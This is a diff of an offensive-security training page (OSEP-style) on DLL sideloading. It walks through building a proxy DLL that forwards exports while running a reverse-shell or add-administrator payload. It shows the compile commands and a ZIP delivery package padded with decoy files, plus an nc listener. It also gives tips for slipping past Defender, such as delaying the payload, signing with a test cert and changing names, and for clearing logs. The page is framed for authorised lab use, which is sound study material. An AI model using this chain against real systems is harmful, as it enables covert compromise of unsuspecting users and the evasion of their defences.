@@ -2,126 +2,103 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 04 · DLL Sideloading
+# DLL sideloading
 
-> Module: `M04` · Scenarios 11–12 · Based on: course chapter 6 (§6.1–6.2)
->
-> Related quick-reference notes keywords: `New Admin with C` / `DLL` / `Shellcode Inject`
->
-> **Prerequisites:** Windows DLL search order, PE import/export tables, calling conventions.
+If a host loads a DLL by bare filename, Windows searches the host EXE's directory first. Replace that same-named DLL with a Proxy that forwards every export to the renamed original (`original.dll`) — the host keeps working, your code still runs.
 
-## 0. Overview
+Search order (SafeDllSearchMode on by default): host EXE directory → System32 → 16-bit system → Windows → current directory → PATH. If the host uses an absolute path into System32, or the target is in KnownDLLs / restricted by `SetDllDirectory`, this path is closed. Sideloading targets a DLL that was supposed to load from the host directory; hijack replaces a system DLL that should load from System32 — this module is the former. If `host.exe`'s import table has `legit.dll:Foo` and our Proxy does not export `Foo`, the process never starts (classic instant exit). Architecture and calling convention must match; `.def` static forwarding keeps original names and conventions, so prefer it over hand-written implementations.
 
-| File | Purpose |
-|---|---|
-| `m04-proxy-dll-sideload.c` | Pure-forward Proxy DLL (forward all exports + keep the host healthy); also the “isolated control” build for scenario 12 |
-| `m04-proxy-dll-newadmin.c` | Live build: create admin / reverse shell (compile-time `MODE` macro); same full export forwarding |
-| `m04-proxy-dll-cpp.cpp` | C++ version + `.def` / name mangling / calling-convention notes (hand-written forward examples for a few functions) |
-| `m04-build-sideload-package.py` | Pack host + Proxy DLL + renamed original DLL into a ZIP; validate PE architecture and file integrity |
+## User opens a program from a ZIP
 
-One-line model: **when the host loads a DLL by bare filename, Windows searches the host EXE’s directory first**. Replace that same-named DLL with your Proxy; the Proxy forwards every export to the renamed original (`original.dll`). The host keeps working; your code still runs.
+If macro, script, and HTML entries are all unavailable, deliver a directory package the user extracts and runs — the (signed) host loads a same-directory DLL. The package must run, not crash the host, and carry a payload.
 
-#### `m04-proxy-dll-sideload.c`
+- [ ] Lock host version and architecture; confirm the sideload point with ProcMon
+- [ ] Export the full original-DLL list and generate `forward.def`
+- [ ] Compile the Proxy (matching arch) and lay out the directory
+- [ ] Pack and validate with `m04-build-sideload-package.py`
+- [ ] Deliver the ZIP; after the shell, `whoami` first — default is user rights
 
-````c
-/*
- * m04-proxy-dll-sideload.c
- *
- * Purpose: "Pure forward / no-payload control" Proxy for DLL sideloading.
- *       Compile to a DLL with the same name as the host's original DLL
- *       (e.g. legit.dll). Forward every export via forward.def to the
- *       renamed original in the same directory (original.dll) so the host
- *       keeps working. This file carries no payload — use it for scenario 12
- *       isolation: prove "forwarding is correct and the host does not crash"
- *       before swapping in the live m04-proxy-dll-newadmin.c.
- * Scenario: M04 · Scenario 11 (compatibility check) / Scenario 12 (first step
- *       when troubleshooting instant exit)
- * Dependencies: MinGW-w64 or MSVC; original DLL export list
- *       (objdump -p / dumpbin /exports)
- * Usage:
- *   # First generate forward.def from the export list (lines like
- *   # "Foo = original.Foo"; see doc §2)
- *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
- *   strip legit.dll
- *   # MSVC: cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
- * Placeholders: none (pure forward; no network/account actions). Debug macros
- *       in the file are off by default.
- * Test status: Not lab-tested (no target VM). Syntax and link style follow
- *   normal MinGW usage; on first use verify in a replica VM with
- *   "host + original.dll renamed beside it" that the host starts cleanly.
- */
+Architecture: `file RunHost.exe` (PE32=x86 / PE32+=x64); on Windows `dumpbin /headers RunHost.exe | findstr machine`. Version: file Properties → Details, or version resources in `dumpbin /headers`. **Record the version**; only that version goes in the package. ProcMon filter `Process Name = RunHost.exe` + `Operation = Load Image`; candidates are `.dll` paths that sit beside `RunHost.exe`. If the DLL actually loads from `C:\Windows\System32`, the host used an absolute path — pick another candidate.
 
-#include <windows.h>
+Export the full original-DLL list (drives `.def` contents):
 
-/*
- * In DLL_PROCESS_ATTACH do the minimum and return TRUE.
- * Rule: DllMain runs under the loader lock — no LoadLibrary, no waits,
- * no network I/O.
- * To confirm "our DLL really loaded" (local triage only; leaves artifacts
- * on a target): define DEBUG_LOADED to append a timestamp line to
- * %TEMP%\m04-sideload-loaded.txt.
- */
-#ifdef DEBUG_LOADED
-#include <stdio.h>
-static void NoteLoaded(void)
-{
-    char path[MAX_PATH];
-    FILE *f;
-    if (!GetTempPathA(MAX_PATH, path))
-        return;
-    lstrcatA(path, "m04-sideload-loaded.txt");
-    f = fopen(path, "a");
-    if (f) {
-        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
-        fclose(f);
-    }
-}
-#endif
+```bash
+# Kali — host / original DLL architecture
+file RunHost.exe original.dll
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-{
-    (void)hModule;
-    (void)lpReserved;
-    switch (ul_reason_for_call) {
-    case DLL_PROCESS_ATTACH:
-#ifdef DEBUG_LOADED
-        NoteLoaded();
-#endif
-        break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
+# Kali — export table (source data for forward.def)
+x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'
+```
 
-/*
- * Optional rundll32 test entry: rundll32 legit.dll,Run verifies this DLL
- * can be loaded and called without the host (helps scenario 12 decide
- * "host environment vs DLL").
- * Note: in a real delivery package the DLL filename must be the name the
- * host loads — do not rely on this entry.
- */
-__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
-                                        LPSTR lpszCmdLine, int nCmdShow)
-{
-    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
-    /* Empty body: only proves load/call chain works */
-}
+```bat
+:: Windows — exports / host imports / machine type
+dumpbin /exports original.dll
+dumpbin /imports RunHost.exe
+dumpbin /headers RunHost.exe | findstr machine
+```
 
-/*
- * Note: all forwarded exports come from forward.def, not C declarations —
- * avoids hand-writing every signature (wrong signature = wrong calling
- * convention = scenario 12 crash).
- * If .def forwarding is unsupported on your toolchain (some old binutils):
- *   1) build with MSVC link.exe /DEF:forward.def;
- *   2) or use the "hand-write a few forwards" mode in m04-proxy-dll-cpp.cpp
- *      (when the function count is small).
- */
-````
+Generate `forward.def` (watch for **ordinal-only exports** and exported variables):
 
-#### `m04-proxy-dll-newadmin.c`
+```
+EXPORTS
+  Foo = original.Foo
+  Bar = original.Bar
+  ; keep ordinal for ordinal-only exports:
+  Baz = original.Baz @12
+```
+
+Bulk generate (Linux; replace `original.dll` with the renamed filename):
+
+```bash
+printf 'EXPORTS\n' > forward.def
+x86_64-w64-mingw32-objdump -p original.dll \
+  | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p' \
+  | grep -o '"[^"]*"' | tr -d '"' \
+  | sed 's/.*/& = original.&/' >> forward.def
+```
+
+Compile the Proxy (`.def` supplies all exports; source only provides `DllMain`/payload):
+
+```bash
+# x64
+x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
+  -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
+# x86 (when the host is 32-bit)
+i686-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
+  -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
+strip legit.dll
+```
+
+MSVC on a replica VM: `cl /LD m04-proxy-dll-newadmin.c /Fe:legit.dll /link /DEF:forward.def ws2_32.lib netapi32.lib`.
+
+Directory package layout (user double-clicks the host after extract):
+
+```
+sideload/
+├─ RunHost.exe      ← original host, untouched
+├─ legit.dll        ← our Proxy (filename = name the host loads)
+├─ original.dll     ← original legit.dll renamed (forward target)
+└─ readme.txt / data files  ← decoys so the tree looks like a normal install
+```
+
+Pack and validate (automatic architecture consistency check):
+
+```bash
+python3 m04-build-sideload-package.py --input-dir ./sideload \
+  --dll-name legit.dll --out sideload-pkg.zip
+```
+
+Put the ZIP on the attacker HTTP service. Reverse mode: `nc -lvnp LPORT`. Add-admin mode: no listener; verify later with `net localgroup administrators`.
+
+User double-clicks → host starts normally (window appears = first proof of successful Proxy forwarding) → payload thread fires. Reverse mode: payload `CreateThread`s the reverse thread from `DllMain` (**do not block in DllMain**). Add-admin mode: `NetUserAdd` + `NetLocalGroupAddMembers`. Optionally `Sleep(3000)` before connect so the UI appears first. After the shell, enumerate / escalate per process; confirm context with `whoami` first. If the host has a `requireAdministrator` manifest or is launched as SYSTEM, the payload elevates automatically — compare integrity level from an elevated prompt.
+
+A no-payload control (`m04-proxy-dll-sideload.c`) that works on a replica VM means forwarding is correct; swapping the live build then only needs payload triage.
+
+If the host crashes immediately, version mismatch or an incomplete export list is the usual cause — take the **same-version** original DLL from the target, regenerate `.def` with `objdump -p`, and verify on a replica VM before delivery (next section). If the DLL actually loads from System32, the sideload point is invalid — re-capture with ProcMon and switch to a bare-name DLL; if none, fall back to another entry. If architecture mismatches, rebuild with the matching `i686-` / `x86_64-` prefix and recheck with `file`. If AV/Defender blocks unsigned DLL sideloading, check `Get-MpComputerStatus`/policy first; alt: sign the Proxy with a test cert, delay the payload, or go forward-only and use in-memory methods after the shell lands. If user rights are too low and the host is not elevated, follow normal privilege escalation — don't hard-code admin actions into the payload.
+
+Mix decoy files into the directory and preserve host function. Delay reverse connect 2–5 seconds; never do heavy work in DllMain (blocking under the loader lock = guaranteed crash). Change names/delays between tests. Cleanup after: `del legit.dll original.dll` + delete the ZIP; don't leave suspiciously named new users in Administrators.
+
+::: details `m04-proxy-dll-newadmin.c` · click to expand
 
 ````c
 /*
@@ -339,142 +316,9 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 }
 ````
 
-#### `m04-proxy-dll-cpp.cpp`
+:::
 
-````cpp
-// m04-proxy-dll-cpp.cpp
-//
-// Purpose: C++ Proxy example for DLL sideloading. Focuses on three points:
-//   1) C++ exports must use extern "C" (otherwise names are mangled and the
-//      host cannot resolve the original names);
-//   2) Calling conventions: __stdcall vs __cdecl — decorated names (@N /
-//      leading underscore) differ;
-//   3) Role of the .def file, and trade-offs between static forwarding vs
-//      hand-written forwarding (runtime GetProcAddress).
-//      Static forwarding (.def: Foo = original.Foo) keeps original names and
-//      conventions automatically — preferred;
-//      The Forwarded wrappers here are only for "host calls a few functions
-//      and you do not want a full .def" — kept as a contrast style.
-// Scenario: M04 · Scenarios 11/12 (C++-shop isomorphic version; .def /
-//      convention triage reference)
-// Dependencies: MinGW-w64 g++ or MSVC; original DLL (renamed original.dll
-//      in the same directory)
-// Usage:
-//   x86_64-w64-mingw32-g++ -shared -O2 -std=c++17 -o legit.dll \
-//       m04-proxy-dll-cpp.cpp forward.def -lws2_32 -lnetapi32
-//   MSVC: cl /LD m04-proxy-dll-cpp.cpp /Fe:legit.dll /link /DEF:forward.def
-// Placeholders: no default payload; LHOST/LPORT notes are given — copy from
-//      m04-proxy-dll-newadmin.c when needed.
-// Test status: Not lab-tested (no target VM); syntax/link shape example only —
-//      verify on a replica VM before use.
-
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
-#include <string>
-
-#pragma comment(lib, "kernel32.lib")
-
-// ---------------------------------------------------------------------------
-// Name-mangling notes (clearest on x86 32-bit; x64 has no cdecl/stdcall split
-// but still has C++ mangling):
-//   C++ member/free functions export mangled names by default (?Foo@@YAHH@Z).
-//   Avoid: wrap in extern "C"; or route everything through .def (.def names
-//   become the export names as written).
-//   In hand-written forwards, names/conventions must match the host imports,
-//   e.g. on 32-bit:
-//     __cdecl  int Foo(int)        -> _Foo
-//     __stdcall int Foo(int)       -> _Foo@4
-//   Write whatever name the host imports. Prefer .def static forwarding to
-//   skip this entirely.
-// ---------------------------------------------------------------------------
-
-extern "C" {
-
-// .def static-forward mode: this file only needs DllMain; all exports come
-// from forward.def:
-//   EXPORTS
-//     Foo = original.Foo
-//     Bar = original.Bar @7        ; keep @N for ordinal-only exports
-// Those forwards make the loader load original.dll from the same directory
-// and continue forwarding — host behavior unchanged.
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-{
-    (void)hModule; (void)lpReserved;
-    switch (ul_reason_for_call) {
-    case DLL_PROCESS_ATTACH:
-        // Payload trigger: CreateThread only — no heavy work here
-        // (loader-lock limits same as the .c version).
-        break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-
-// ---------------------------------------------------------------------------
-// Contrast style: hand-written forwarding (runtime). Use only when the
-// original DLL exports few functions and you have every prototype. On first
-// call, resolve from same-directory original.dll and cache.
-// If the original exports dozens of functions, do not hand-write — use .def
-// full forwarding.
-// ---------------------------------------------------------------------------
-
-namespace {
-
-HMODULE g_original = nullptr;      // cached original.dll handle (lazy on first call)
-
-HMODULE LoadOriginal()
-{
-    if (g_original == nullptr)
-        g_original = LoadLibraryW(L"original.dll");
-    return g_original;
-}
-
-} // namespace
-
-// Example: host imports original.dll's __cdecl int Foo(int).
-// Export name is controlled by .def (recommended: Foo = original.Foo). Without
-// .def, if you use __declspec(dllexport), the export name of this signature
-// must match the host import name.
-__declspec(dllexport) int __cdecl Foo(int a)
-{
-    HMODULE h = LoadOriginal();
-    if (h == nullptr)
-        return -1;                 // fail soft if original.dll is missing — avoid host crash
-    typedef int(__cdecl *FooFn)(int);
-    FooFn fn = reinterpret_cast<FooFn>(GetProcAddress(h, "Foo"));
-    return fn ? fn(a) : -1;
-}
-
-// Example: __stdcall with 2 args → export name _Bar@8 on 32-bit.
-__declspec(dllexport) int __stdcall Bar(int a, int b)
-{
-    HMODULE h = LoadOriginal();
-    if (h == nullptr)
-        return -1;
-    typedef int(__stdcall *BarFn)(int, int);
-    BarFn fn = reinterpret_cast<BarFn>(GetProcAddress(h, "Bar"));
-    return fn ? fn(a, b) : -1;
-}
-
-} // extern "C"
-
-// ---------------------------------------------------------------------------
-// Project advice:
-//   * Prefer .def when available (original names/conventions/ordinals kept;
-//     no need to worry about extern "C");
-//   * One function per .def line; generate from the original DLL with
-//     objdump -p / dumpbin /exports;
-//   * Payload code (reverse / add-admin) is shared with the .c version —
-//     port from m04-proxy-dll-newadmin.c into DllMain or a dedicated thread
-//     function when needed.
-// ---------------------------------------------------------------------------
-````
-
-#### `m04-build-sideload-package.py`
+::: details `m04-build-sideload-package.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -671,185 +515,285 @@ if __name__ == "__main__":
     sys.exit(main(sys.argv[1:]))
 ````
 
-## 1. Core concepts (memorize these four)
+:::
 
-1. **Search order (SafeDllSearchMode on by default)**: host EXE directory → System32 → System16 → Windows → current directory → PATH. Sideloading works when the host loads the DLL by **bare name or relative path** (e.g. `LoadLibrary("updater.dll")`). If the host uses an **absolute path** into System32, or the target is in KnownDLLs / restricted by `SetDllDirectory`, this path is closed (→ failure branch 2).
-2. **Sideload ≠ Hijack**: Sideloading targets a DLL that was **supposed** to load from the host directory (usually a private, benign DLL) — we just place a same-named file first. Hijack replaces a system DLL that should load from System32. OSEP scenario 11 is the former: files go in the host directory, and the host must still start normally.
-3. **Host imports resolve at load time**: if `host.exe`'s import table has `legit.dll:Foo`, the loader must find `Foo` in our DLL's export table — **missing export = process never starts (classic “instant exit”)**. So the Proxy either forwards every export or implements every function the host actually calls.
-4. **Architecture and bitness must match**: an x86 host can only load an x86 Proxy (load failure = crash); calling-convention mismatch (stdcall/cdecl) crashes on the **first call**. `.def` static forwarding **naturally keeps original names and conventions**, so prefer it over hand-written implementations.
 
-Forwarding mechanism: at link time a `.def` writes each export as `Foo = original.Foo`; when resolving that export the loader **automatically loads same-directory `original.dll`** and continues forwarding. The Proxy only keeps `DllMain` (+ payload thread) and does not need every function signature.
+## DLL loads, program exits immediately
 
-## 2. Scenario 11: User opens a program from a ZIP, but macro/script entry points are unavailable
+If the sideload point works and the target ran the program, but it exits as soon as it starts, the usual cause is a broken contract between the Proxy and the host — missing export, DllMain crash, or calling-convention mismatch — not "payload was detected."
 
-### Situation
-Deliver a ZIP; the user extracts and runs the (signed) program inside; that program loads a same-directory DLL. Macros, scripts, HTML, and similar entries are all unavailable — the only execution surface is this DLL sideload. Deliver a directory package that “runs, does not crash the host, and carries a payload.”
+- [ ] Confirm the stock host + stock DLL pair runs normally on a clean VM
+- [ ] Drop the no-payload Proxy (`m04-proxy-dll-sideload.c`); if it crashes, fix exports and conventions first
+- [ ] After no-payload passes, swap the live build; if that crashes, move payload out of DllMain into `CreateThread` + SEH
+- [ ] Confirm Event Viewer no longer faults `legit.dll`, the host stays alive, and the payload works
 
-### Assumptions
-- Host program name and **exact version** are known (export tables change by version; wrong version = crash).
-- Host truly loads the same-directory DLL by bare/relative name (verify once with ProcMon on a local VM).
-- Target allows the program to run (it is a whitelisted “allowed to start” binary; AppLocker/AV does not block the host; **our unsigned DLL** may still be scanned → OPSEC section).
-- User runs as a normal user: payload defaults to user rights; if the host has a `requireAdministrator` manifest or is launched as SYSTEM by a scheduled task, the payload elevates automatically (see Verify).
+Locate the crash in Event Viewer → Windows Logs → Application → Error / `Application Error` 1000, **faulting module name**: our `legit.dll` means our code / DllMain; host or a system DLL means run the stock pair as a control first. If the popup is "The procedure entry point `X` could not be located in ... `legit.dll`," a unique export is missing.
 
-### Prepare (attacker side)
-1. **Lock host version and architecture** (once on the target / replica VM):
-   - Architecture: `file RunHost.exe` (PE32=x86 / PE32+=x64); on Windows `dumpbin /headers RunHost.exe | findstr machine`.
-   - Version: file Properties → Details, or version resources in `dumpbin /headers`. **Record the version**; only that version goes in the package.
-   - Confirm the sideload point: ProcMon filter `Process Name = RunHost.exe` + `Operation = Load Image`, find entries whose `Path` ends in `.dll` and sits beside `RunHost.exe` — those are candidates. If the target DLL actually loads from System32 (Result path under `C:\Windows\System32`), the host used an absolute path — pick another candidate.
-2. **Export the full original-DLL list** (drives `.def` contents):
-   - Kali: `x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'` for names; `file original.dll` for arch.
-   - Windows: `dumpbin /exports original.dll` (ordinals + RVAs; watch for **ordinal-only exports** and exported variables).
-3. **Generate forward `.def`** (same directory as sources; name is free, e.g. `forward.def`):
-   ```
-   EXPORTS
-     Foo = original.Foo
-     Bar = original.Bar
-     ; keep ordinal for ordinal-only exports:
-     Baz = original.Baz @12
-   ```
-   Bulk generate (Linux; replace `original.dll` with the renamed filename):
-   ```bash
-   printf 'EXPORTS\n' > forward.def
-   x86_64-w64-mingw32-objdump -p original.dll \
-     | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p' \
-     | grep -o '"[^"]*"' | tr -d '"' \
-     | sed 's/.*/& = original.&/' >> forward.def
-   ```
-4. **Compile the Proxy** (either toolchain; `.def` supplies all exports; source only provides `DllMain`/payload):
-   - MinGW (build directly on Kali/attacker):
-     ```bash
-     # x64
-     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
-       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
-     # x86 (when the host is 32-bit)
-     i686-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
-       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
-     strip legit.dll
-     ```
-   - MSVC (build on replica VM): `cl /LD m04-proxy-dll-newadmin.c /Fe:legit.dll /link /DEF:forward.def ws2_32.lib netapi32.lib`
-5. **Directory package layout** (user double-clicks the host after extract):
-   ```
-   sideload/
-   ├─ RunHost.exe      ← original host, untouched
-   ├─ legit.dll        ← our Proxy (filename = name the host loads)
-   ├─ original.dll     ← original legit.dll renamed (forward target)
-   └─ readme.txt / data files  ← decoys so the tree looks like a normal install
-   ```
-6. **Pack and validate** (automatic architecture consistency check): `m04-build-sideload-package.py` (below). Put the ZIP on the attacker HTTP service and open the listener:
-   - Reverse mode: `nc -lvnp LPORT`
-   - Add-admin mode: no listener needed; verify later with `net localgroup administrators`.
+Diff what the host wants vs what the Proxy exports:
 
-### Steps
-1. Deliver the ZIP (email / web download); guide the user to “extract and run `RunHost.exe`.”
-2. User double-clicks → host starts normally (window appears = first proof of successful Proxy forwarding) → payload thread fires.
-   - Reverse mode: payload `CreateThread`s the reverse thread from `DllMain` (**do not block in DllMain**; see scenario 12); attacker receives a shell within seconds.
-   - Add-admin mode: `NetUserAdd` + `NetLocalGroupAddMembers` from the payload path.
-3. Keep the host alive: payload is a background thread; host keeps running (optionally `Sleep(3000)` before connect so the UI appears first — looks more like a normal program).
-4. After the shell, enumerate / escalate per process (default user rights); confirm context with `whoami` first.
-
-### Scripts used
-- `m04-proxy-dll-newadmin.c` (live; compile commands above)
-- `m04-build-sideload-package.py` (pack + arch check)
-- `m04-proxy-dll-sideload.c` (no-payload control during triage; see scenario 12)
-
-### Verify
-- Reverse: listener gets a connection, `whoami` works; host window still up (`tasklist | findstr RunHost`).
-- Add-admin: `net localgroup administrators` shows the new user; host process alive.
-- No-payload control (`m04-proxy-dll-sideload.c`) works on a **replica VM** = Proxy forwarding is correct; swapping the live build only needs payload triage.
-- Privilege assertion: run the same program from an elevated prompt and compare `whoami` integrity level; if the host elevates via manifest, the payload is High Integrity (→ admin actions are available directly).
-
-### Failure branches and alternatives
-1. **Host version mismatch / incomplete export list** → missing import = crash. Fix: take the **same-version** original DLL from the target, regenerate `.def` with `objdump -p`; verify on a replica VM with that version before delivery.
-2. **DLL actually loads from System32 (absolute path / KnownDLLs)** → sideload point invalid. Alt: re-capture with ProcMon; switch to a DLL that loads by bare name from the host directory; if none, fall back to another entry (this package only covers the DLL line).
-3. **Architecture mismatch** (Proxy built x64, host is x86) → rebuild with the matching `i686-` / `x86_64-` prefix; recheck with `file`.
-4. **AV/Defender blocks “unsigned DLL sideloading”** (`EnableSideloading` defenses) → check local `Get-MpComputerStatus`/policy first; alt: sign the Proxy with a test cert, change payload timing (delay + decoy traffic), or change payload shape (forward-only, then in-memory methods after the shell lands).
-5. **User rights too low and host is not elevated** → you get a restricted user; follow normal privilege escalation — do not hard-code admin actions into the payload (OSEP scenarios often provide an escalatable environment).
-
-### Exam / OPSEC notes
-- Mix decoy files into the directory and **preserve host function** (window normal, business normal) so users/admins are less likely to notice anomalies.
-- Delay reverse connect 2–5 seconds before starting the thread — avoid “double-click then immediate egress” behavior; never do heavy work in DllMain (blocking under the loader lock = guaranteed crash).
-- Repeated tests leave fingerprints: dropping the same DLL many times on one VM helps behavior engines cluster samples — change names/delays between tests.
-- Cleanup after: `del legit.dll original.dll` + delete the ZIP (delete later if the host is still open); avoid leaving suspiciously named new users in `Administrators` (remove after the exam).
-- Defender sideload ASR rules (e.g. “Block executable files from running unless they meet a prevalence, age, or trusted list criteria”) may flag this pattern — validate on a small scope before bulk delivery.
-
-## 3. Scenario 12: DLL is loaded, but the program exits immediately
-
-### Situation
-The sideload point itself works and the target ran the program, but the program **exits as soon as it starts**, so later stages never run. Root cause is usually not “payload was detected,” but a **broken contract between Proxy DLL and host**: import resolution failure / DllMain crash / calling-convention mismatch.
-
-### Assumptions
-- Confirmed the host loaded our DLL (ProcMon / `Load Image` hit, or Error Reporting points at our module).
-- Assume “host + original DLL” alone runs normally (verify the stock pair on a clean VM first).
-
-### Prepare (attacker side)
-1. Locate the crash source in Event Viewer (target / replica VM):
-   - Event Viewer → Windows Logs → Application → find Error / `Application Error` 1000, check **faulting module name**:
-     - our `legit.dll` → our code / DllMain problem;
-     - host or system DLL → not necessarily us (run stock pair as control first).
-   - If the popup is “The procedure entry point `X` could not be located in ... `legit.dll`” → **missing export**; go to step 2.
-2. Missing-export triage (most common):
-   - What the host wants from us: `dumpbin /imports RunHost.exe`, find the `legit.dll` section.
-   - What our Proxy actually exports: `dumpbin /exports legit.dll` (Windows) or `objdump -p legit.dll` (Kali).
-   - Diff → regenerate `forward.def` (full original exports); **for ordinal-only exports the `.def` must keep `@N`**.
-3. Calling convention / name triage:
-   - If `dumpbin /exports original.dll` shows decorated names (`_Foo@8` / `Foo@8`), it is stdcall; hand-written implementations must be `__stdcall` with matching parameter byte counts (`@8` = two 4-byte args). **`.def` static forwarding skips this entirely** — preferred path.
-   - On x86, cdecl export is `_Foo`, stdcall is `_Foo@N`; mixing them means “loads fine, crashes on first call.”
-4. DllMain crash triage:
-   - Rebuild/replace with `m04-proxy-dll-sideload.c` (no-payload pure forward): no crash → problem is payload init, not forwarding.
-   - Reintroduce payload gradually: move DllMain work into a `CreateThread` function wrapped in SEH (`__try/__except`); never `LoadLibrary` / `WaitForSingleObject` / network I/O inside DllMain (loader lock → deadlock or exception).
-5. Control: copy `original.dll` back to the original name `legit.dll` (remove our file) and run the host — if it still crashes, the problem is the host environment (missing VC runtime, etc.), unrelated to this module.
-
-### Steps
-1. On a replica VM, run “stock host + stock DLL” and confirm the baseline is healthy.
-2. Drop the “no-payload Proxy”: healthy → forwarding OK; crash → return to prepare steps 2/3 for exports and calling conventions.
-3. After no-payload passes, swap the live build (`m04-proxy-dll-newadmin.c`); if it crashes → payload trigger style: thread + SEH + delay; DllMain only does `CreateThread`.
-4. Confirm in Event Viewer: faulting module no longer points at `legit.dll`; host stays alive; payload works.
-
-### Scripts used
-- `m04-proxy-dll-sideload.c` (isolation control: no-payload pure forward)
-- `m04-proxy-dll-newadmin.c` (live build; note its DllMain only `CreateThread`s)
-- `m04-proxy-dll-cpp.cpp` (.def / calling-convention notes + hand-written forward examples for a few functions)
-- Toolchain: `dumpbin /exports|/imports|/headers`, `objdump -p`, ProcMon, Event Viewer.
-
-### Verify
-- Host process stays alive in Task Manager / `tasklist` for >30 seconds with a usable window.
-- Event Viewer has no new `legit.dll` faulting records.
-- Payload checks match scenario 11 (reverse received / new user in Administrators).
-- Cross-check: build once for x64 and once for x86; confirm the packer’s architecture assertions match reality.
-
-### Failure branches and alternatives
-1. **Incomplete export forward; missing a function only used on a rare code path** → host looks fine until a specific button is clicked. Alt: blindly forward the full original DLL (entire objdump table into `.def`); do not hand-pick functions.
-2. **Original DLL exports data (variables), not only functions** → export forwarding does not work for data exports (forwarding is for functions). Alt: that DLL is a poor Proxy candidate — pick another sideload point; or hand-implement and handle the data symbol (rare; confirm the real hit with ProcMon first).
-3. **Ordinal-only exports (no names)** → write `Foo = original.Foo @N` in `.def` to keep ordinals; when the host imports by ordinal our export ordinals must match.
-4. **Payload crashes immediately in DllMain; still crashes after moving to a thread** → payload itself is wrong (e.g. shellcode length/bitness): first verify the path with a harmless action (write a file / MessageBox), then swap the real payload; wrap with SEH so the host does not die with it.
-5. **“Instant exit” is actually AV killing the process** → faulting module is `MsMpEng.exe` / a behavior engine: return to scenario 11 failure branch 4; do not waste time on Proxy forwarding.
-
-### Exam / OPSEC notes
-- **Isolate variables before changing code**: the no-payload control build is scenario 12’s first diagnostic tool — avoids leaving many samples while iterating on a live DLL.
-- Event Viewer records every crash (including module path) — crash freely on the replica VM; on the target minimize crash count, clear Application logs after, or change payload shape.
-- Blocking/deadlock in DllMain does not just crash — it can freeze the host where the user notices; stick to “DllMain only starts a thread.”
-- Hand-written export implementations can leak toolchain info via mangled names; `.def` forwarding is cleanest — prefer it in the final package.
-
-## 4. Appendix: command quick reference
-
-```bash
-# Kali — host / original DLL architecture
-file RunHost.exe original.dll
-
-# Kali — export table (source data for forward.def)
-x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'
-
-# Windows — exports / host imports / machine type
-dumpbin /exports original.dll
+```bat
 dumpbin /imports RunHost.exe
-dumpbin /headers RunHost.exe | findstr machine
-
-# Pack (ZIP after architecture consistency checks)
-python3 m04-build-sideload-package.py --input-dir ./sideload \
-  --dll-name legit.dll --out sideload-pkg.zip
-
-# Listener (reverse mode)
-nc -lvnp LPORT
+dumpbin /exports legit.dll
 ```
 
-Directory layout, version/architecture assertions, and decoy files get a final consistency check inside `m04-build-sideload-package.py`; before delivery, confirm once more with ProcMon on a replica VM that “Load Image hits our legit.dll.”
+Or on Kali: `objdump -p legit.dll`. Regenerate `forward.def` from the **full** original export list; for ordinal-only exports the `.def` must keep `@N`. If `dumpbin /exports original.dll` shows decorated names (`_Foo@8` / `Foo@8`), it is stdcall; hand-written implementations must be `__stdcall` with matching parameter byte counts (`@8` = two 4-byte args). On x86, cdecl is `_Foo`, stdcall is `_Foo@N`; mixing them means "loads fine, crashes on first call." `.def` static forwarding skips this entirely — prefer it. The C++ notes in `m04-proxy-dll-cpp.cpp` cover `extern "C"`, name mangling, and a few hand-written forwards for contrast.
+
+DllMain crash triage: replace with the no-payload Proxy. No crash → problem is payload init, not forwarding. Reintroduce payload gradually: move DllMain work into a `CreateThread` function wrapped in SEH (`__try/__except`); never `LoadLibrary` / `WaitForSingleObject` / network I/O inside DllMain (loader lock → deadlock or exception). Control: copy `original.dll` back to the name `legit.dll` (remove our file) and run the host — if it still crashes, the problem is the host environment (missing VC runtime, etc.), unrelated to this module.
+
+Verify: host process stays alive in Task Manager / `tasklist` for >30 seconds with a usable window; Event Viewer has no new `legit.dll` faulting records; payload checks match the previous section (reverse received / new user in Administrators). Cross-check by building once for x64 and once for x86; confirm the packer's architecture assertions match reality.
+
